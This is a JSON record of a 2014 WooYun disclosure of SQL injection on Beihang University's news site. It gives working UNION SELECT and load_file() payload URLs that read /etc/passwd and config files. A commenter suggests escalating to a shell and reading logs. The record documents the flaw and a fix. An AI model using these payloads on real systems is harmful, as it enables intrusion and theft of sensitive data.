{"id": 53948, "wybug_id": "wooyun-2014-066002", "wybug_title": "北航新闻网SQL注射漏洞可致任意文件读取和敏感信息泄漏", "wybug_corp": "北京航空航天大学", "wybug_author": "F1uYu4n", "wybug_date": "2014-06-24 10:33", "wybug_open_date": "2014-06-29 10:34", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "3", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-29：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 第一次发，都是load_file的错~~ 详细说明：  \nhttp://news.buaa.edu.cn/dispnews.php?type=1&nid=113844&s_table=news_txt\n该处参数没有过滤，导致产生注入。\nhttp://news.buaa.edu.cn/dispnews.php?s_table=news_txt&type=10&nid=112957%27%20and%20%27a%27=%27b%27%20union%20select%201,user(),version(),current_user(),5,6,7,8,9,10,11,12,database(),14,15,16,17,18,19/**\n\n\n由于MySQL数据库版本是4.1且设计的表名略奇葩，结果sqlmap一个表都没猜解出，但是数据库权限是root，通过load_file()可以任意读取文件和源码，得到各种表名列名，造成敏感信息泄漏。   漏洞证明：  load_file(/etc/passwd)\nhttp://news.buaa.edu.cn/dispnews.php?s_table=news_txt&type=10&nid=112957%27%20and%20%27a%27=%27b%27%20union%20select%201,2,load_file(0x2f6574632f706173737764),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19/**\n\n\n这里直接泄漏了网站的路径。<br />load_file(/******/dispnews.php)\n\n发现了配置文件的路径，直接读取之。<br />load_file(/******/config/config.php)\n\n其实sqlmap跑出root密码的hash值的时候，发现已有前人探索过，因为cmd5一提交就提示100%解密失败，orz……<br />探寻了大部分源文件后得到了一些表名和列名，不过这些都是和新闻相关，没有太大价值，但当我把文件路径指向上一级的时候，发现了疑似已不再使用的旧北航首页。虽然不再使用，但是数据库还在，里面还有不少敏感信息。\n\n\n\n到此结束。   修复方案：  输入过滤，不再使用的网站可以删除源码和对应数据库。   版权声明：转载请注明来源 F1uYu4n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-06-29 10:34 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-01 17:38 |    \t\t廷廷 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 有很强的好奇心，爱好广泛，求女女带走。。...)\t\t \n   有读取权限可以试试读网页文件 审计一下试试拿拿SHELL的， 另外能LOAD_file了 读下日志文件应该有不寻常的收获    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}